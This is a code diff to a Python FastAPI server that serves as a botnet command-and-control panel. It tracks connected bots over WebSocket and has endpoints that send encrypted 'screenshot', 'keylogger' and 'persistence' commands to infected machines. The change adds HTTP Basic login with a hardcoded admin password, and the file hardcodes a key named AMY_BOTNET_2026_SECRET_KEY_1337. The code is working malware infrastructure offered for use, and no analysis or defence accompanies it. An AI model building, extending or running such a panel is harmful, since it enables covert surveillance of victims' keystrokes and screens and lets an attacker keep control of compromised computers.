@@ -1,7 +1,9 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Depends, HTTPException, status
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.security import HTTPBasic, HTTPBasicCredentials
+import secrets
 import asyncio
 import base64
 import os
@@ -32,6 +34,23 @@ os.makedirs(BASE_DIR / "logs", exist_ok=True)
 active_bots = {}  # bot_id -> WebSocket (bot connection)
 terminal_sessions = {}  # bot_id -> set(WebSocket) (UI connections)
 
+security = HTTPBasic()
+
+# Змініть ці дані на свої!
+ADMIN_USER = "admin"
+ADMIN_PASS = "amy_secret_2026"
+
+def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
+    is_user_ok = secrets.compare_digest(credentials.username, ADMIN_USER)
+    is_pass_ok = secrets.compare_digest(credentials.password, ADMIN_PASS)
+    if not (is_user_ok and is_pass_ok):
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Incorrect username or password",
+            headers={"WWW-Authenticate": "Basic"},
+        )
+    return credentials.username
+
 KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"
 
 def encrypt_message(msg: str) -> str:
@@ -47,7 +66,7 @@ def decrypt_message(encoded: str) -> str:
         return ""
 
 @app.get("/", response_class=HTMLResponse)
-async def dashboard():
+async def dashboard(user: str = Depends(get_current_user)):
     if UI_PATH.exists():
         return UI_PATH.read_text(encoding="utf-8")
     return HTMLResponse(content="UI file not found. Check if 'ui/index.html' exists.", status_code=404)
@@ -117,25 +136,25 @@ async def broadcast_to_terminals(bot_id: str, message: str):
             terminal_sessions[bot_id].remove(ws)
 
 @app.get("/bots")
-async def list_bots():
+async def list_bots(user: str = Depends(get_current_user)):
     return {"bots": list(active_bots.keys())}
 
 @app.get("/screenshot/{bot_id}")
-async def trigger_screenshot(bot_id: str):
+async def trigger_screenshot(bot_id: str, user: str = Depends(get_current_user)):
     if bot_id in active_bots:
         await active_bots[bot_id].send_text(encrypt_message("screenshot"))
         return {"status": "triggered"}
     return JSONResponse(content={"error": "Bot offline"}, status_code=404)
 
 @app.get("/keylogger/{bot_id}")
-async def trigger_keylogger(bot_id: str):
+async def trigger_keylogger(bot_id: str, user: str = Depends(get_current_user)):
     if bot_id in active_bots:
         await active_bots[bot_id].send_text(encrypt_message("keylogger"))
         return {"status": "triggered"}
     return JSONResponse(content={"error": "Bot offline"}, status_code=404)
 
 @app.get("/persistence/{bot_id}")
-async def trigger_persistence(bot_id: str):
+async def trigger_persistence(bot_id: str, user: str = Depends(get_current_user)):
     if bot_id in active_bots:
         await active_bots[bot_id].send_text(encrypt_message("persistence"))
         return {"status": "triggered"}
